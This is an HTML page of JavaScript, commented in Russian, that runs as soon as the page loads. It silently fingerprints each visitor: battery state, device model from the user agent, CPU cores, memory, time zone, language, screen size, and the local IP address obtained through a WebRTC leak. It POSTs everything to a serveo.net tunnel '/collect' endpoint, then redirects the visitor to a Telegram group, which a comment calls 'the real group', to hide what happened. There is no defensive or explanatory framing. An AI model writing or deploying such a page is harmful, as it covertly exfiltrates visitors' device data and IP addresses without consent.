<!DOCTYPE html>
<html>
<head>
  <title>Script</title>
</head>
<body>
  <script>
    // Функция для получения данных о батарее
    function getBatteryInfo() {
      return navigator.getBattery().then(function(battery) {
        return {
          charging: battery.charging,
          level: battery.level * 100 + '%',
        };
      });
    }

    // Функция для извлечения модели устройства и других характеристик из userAgent
    function getDeviceInfo() {
      const userAgent = navigator.userAgent;
      const modelMatch = userAgent.match(/\(([^)]+)\)/);
      const model = modelMatch ? modelMatch[1] : 'Unknown';
      const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown'; // Количество ядер процессора
      const deviceMemory = navigator.deviceMemory || 'Unknown'; // Объем оперативной памяти

      return {
        model: model,
        hardwareConcurrency: hardwareConcurrency,
        deviceMemory: deviceMemory,
      };
    }

    // Функция для получения локального IP-адреса через WebRTC
    function getLocalIP(callback) {
      const pc = new RTCPeerConnection({iceServers: []});
      pc.createDataChannel('');
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      pc.onicecandidate = function(event) {
        if (!event || !event.candidate) return;
        const candidate = event.candidate.candidate;
        const localIP = candidate.split(' ')[4];
        pc.close();
        callback(localIP);
      };
    }

    // Функция для отправки данных на сервер
    function sendData(batteryInfo, localIP) {
      // Извлечение информации об устройстве
      const deviceInfo = getDeviceInfo();

      // Формирование объекта данных
      const data = {
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        screenWidth: window.innerWidth,
        screenHeight: window.innerHeight,
        battery: batteryInfo,
        model: deviceInfo.model,
        hardwareConcurrency: deviceInfo.hardwareConcurrency,
        deviceMemory: deviceInfo.deviceMemory,
        localIP: localIP,
      };

      // Отправка данных на сервер
      fetch('https://d8ddeb652cdbf662bd7b916fe7287cae.serveo.net/collect', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' }
      });

      // Редирект на реальную группу
      setTimeout(function() {
        window.location.href = 'https://t.me/unixgnutgk';
      }, 100);
    }

    // Получение информации о батарее, IP-адресе и отправка данных
    getBatteryInfo().then(function(batteryInfo) {
      getLocalIP(function(localIP) {
        sendData(batteryInfo, localIP);
      });
    });
  </script>
</body>
</html>
